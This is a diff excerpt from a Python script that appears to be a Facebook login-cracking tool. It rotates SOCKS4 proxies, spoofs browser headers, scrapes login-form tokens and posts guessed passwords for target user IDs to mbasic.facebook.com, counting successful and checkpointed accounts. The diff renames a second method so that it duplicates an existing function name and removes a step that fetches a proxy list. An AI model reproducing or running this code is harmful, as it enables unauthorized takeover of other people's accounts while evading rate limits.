@@ -310,7 +310,7 @@ def md1(idf,pwv):
       time.sleep(33)
   loop+=1
 #---------------------[Method-2]---------------------#
-def md2(idf,pwv):
+def md1(idf,pwv):
   global loop,ok,cp
   sys.stdout.write(f'\r{P} [Asdel-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
   sys.stdout.flush()
@@ -320,10 +320,6 @@ def md2(idf,pwv):
     try:
       nip=random.choice(proxsi)
       proxs= {'http': 'socks4://'+nip}
-      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
-      open('http.txt','w').write(proxs)
-      nip = rc(proxs)
-      proxs = {'http': 'socks4://'+nip}
       ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'en-MA,en;q=0.9,fr-MA;q=0.8,fr;q=0.7,en-GB;q=0.6,en-US;q=0.5'})
       p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
       dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
